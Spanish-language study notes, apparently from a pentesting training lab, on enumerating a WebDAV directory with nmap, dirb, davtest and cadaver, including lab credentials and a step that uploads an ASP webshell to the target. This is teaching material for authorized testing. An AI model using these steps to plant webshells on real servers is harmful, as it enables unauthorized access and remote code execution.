# 🌐 Enumeración de WebDAV

## 🔍 Descubriendo el directorio WebDAV

El primer paso consiste en identificar si el servidor web expone un directorio que soporte métodos WebDAV. Se utiliza un escaneo de scripts Nmap o un recorrido con `dirb`.

### Mediante script Nmap

```bash
nmap --script http-enum -sV -p 80 demo.ine.local
```

La salida mostrará rutas como `/webdav` junto con el código de estado. Si devuelve **401 Unauthorized**, significa que el directorio existe pero requiere autenticación.

### Si el script Nmap es muy lento

```bash
dirb http://demo.ine.local
```

`dirb` fuerza la búsqueda de directorios comunes y también puede encontrar `/webdav`.

## 🧪 Análisis de capacidades con davtest

`davtest` permite comprobar qué tipos de archivo se pueden **subir** y **ejecutar** en el directorio WebDAV, y también verifica si se pueden usar métodos como PUT o DELETE. Se ejecuta primero sin autenticación y luego con credenciales.

### Sin autenticación (si el directorio es público)

```bash
davtest -url http://demo.ine.local/webdav
```

Si la ruta está protegida, se añade el parámetro `-auth`.

### Con autenticación

```bash
davtest -auth bob:password_123321 -url http://demo.ine.local/webdav
```

| Opción     | Valor                     |
|------------|---------------------------|
| `-auth`    | `usuario:contraseña`      |
| `-url`     | URL completa del recurso  |

La salida lista todos los tipos de archivo cargados y destaca aquellos que el servidor permite **ejecutar** (por ejemplo, `asp`, `txt`, `html`). Esta información es clave para futuras explotaciones.

## 🗂️ Interacción manual con cadaver

`cadaver` es un cliente WebDAV interactivo similar a un cliente FTP. Permite listar contenidos, subir y descargar archivos.

### Conexión y autenticación

```bash
cadaver http://demo.ine.local/webdav
```

Cuando lo solicite, se introducen las credenciales (ej. `bob:password_123321`). Una vez dentro, los comandos más útiles son:

| Comando    | Descripción                         |
|------------|-------------------------------------|
| `ls`       | Lista el contenido del directorio   |
| `put archivo` | Sube un archivo local al servidor |
| `get archivo` | Descarga un archivo del servidor |
| `delete archivo` | Elimina un archivo remoto       |
| `quit`     | Sale de la sesión                   |

### Ejemplo de subida y verificación

```bash
put /usr/share/webshells/asp/webshell.asp
ls
```

Con esto se confirma que la carga de archivos `.asp` es posible y que el archivo permanece en el directorio.

## 📋 Resumen de herramientas de enumeración

| Herramienta | Propósito |
|-------------|-----------|
| `nmap --script http-enum` | Descubrir directorios web interesantes (incluye WebDAV) |
| `dirb`                     | Fuerza bruta de directorios si el script Nmap es lento |
| `davtest`                  | Probar métodos PUT/DELETE y averiguar tipos de archivo ejecutables |
| `cadaver`                  | Cliente interactivo para listar, subir y descargar archivos |

La fase de enumeración con `davtest` revela exactamente qué extensiones son ejecutables y si el servidor permite la subida de scripts, lo que allana el camino para la fase de explotación.
